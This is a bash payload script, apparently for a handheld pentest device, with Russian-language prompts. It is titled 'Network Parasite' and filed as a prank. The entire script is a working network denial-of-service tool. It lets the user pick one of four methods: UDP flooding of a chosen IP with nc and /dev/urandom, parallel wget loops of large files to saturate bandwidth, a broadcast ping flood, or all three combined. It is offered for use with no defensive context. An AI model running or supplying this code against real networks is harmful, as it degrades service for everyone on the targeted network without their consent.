#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
# Title: Сетевой Паразит
# Author: bad-antics
# Description: Поглощает трафик для замедления целевой сети
# Category: nullsec/pranks

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "СЕТЕВОЙ ПАРАЗИТ

Поглощает трафик в
целевой сети, чтобы
замедлить всех пользователей.

Методы:
- UDP флуда
- Цикл загрузок
- Мультикаст спам

Нажмите ОК для продолжения."

INTERFACE="$IFACE"

PROMPT "МЕТОД:

1. UDP Флуд (быстрый)
2. Цикл загрузок
3. Шторм вещания
4. Комбинированный хаос

Выберите метод далее."

METHOD=$(NUMBER_PICKER "Method (1-4):" 1)
DURATION=$(NUMBER_PICKER "Duration (sec):" 30)

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ ПАРАЗИТА?

Это поглотит
массивный трафик.

Сеть замедлится
до ползания.

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Сетевой Паразит активен..."
SPINNER_START "Поглощаю трафик..."

case $METHOD in
    1) # UDP Flood
        TARGET=$(TEXT_PICKER "Целевой IP:" "192.168.1.1")
        
        # Generate traffic
        for i in $(seq 1 10); do
            cat /dev/urandom | nc -u -w $DURATION $TARGET $((5000 + i)) &
        done
        
        sleep $DURATION
        killall nc 2>/dev/null
        ;;
        
    2) # Download loop
        PROMPT "ЦИКЛ ЗАГРУЗОК

Будет непрерывно
загружать большие файлы.

Требует интернета.

Нажмите ОК для продолжения."
        
        for i in $(seq 1 5); do
            timeout $DURATION wget -q -O /dev/null "http://speedtest.tele2.net/100MB.zip" &
        done
        
        sleep $DURATION
        killall wget 2>/dev/null
        ;;
        
    3) # Broadcast storm
        GATEWAY=$(ip route | grep default | awk '{print $3}')
        BROADCAST=$(ip addr show $INTERFACE | grep "brd" | awk '{print $4}' | head -1)
        BROADCAST=${BROADCAST:-255.255.255.255}
        
        for i in $(seq 1 20); do
            ping -b -f -c 10000 $BROADCAST &
        done
        
        sleep $DURATION
        killall ping 2>/dev/null
        ;;
        
    4) # Combined
        TARGET=$(TEXT_PICKER "Целевой IP:" "192.168.1.1")
        BROADCAST=$(ip addr show $INTERFACE | grep "brd" | awk '{print $4}' | head -1)
        
        # UDP flood
        cat /dev/urandom | nc -u -w $DURATION $TARGET 5000 &
        # Broadcast
        ping -b -f -c 10000 ${BROADCAST:-255.255.255.255} &
        # Download
        timeout $DURATION wget -q -O /dev/null "http://speedtest.tele2.net/10MB.zip" &
        
        sleep $DURATION
        killall nc ping wget 2>/dev/null
        ;;
esac

SPINNER_STOP

PROMPT "ПАРАЗИТ ЗАВЕРШЕН

Трафик поглощен
за ${DURATION}с.

Сеть должна вернуться
к нормальному состоянию.

Нажмите ОК для выхода."
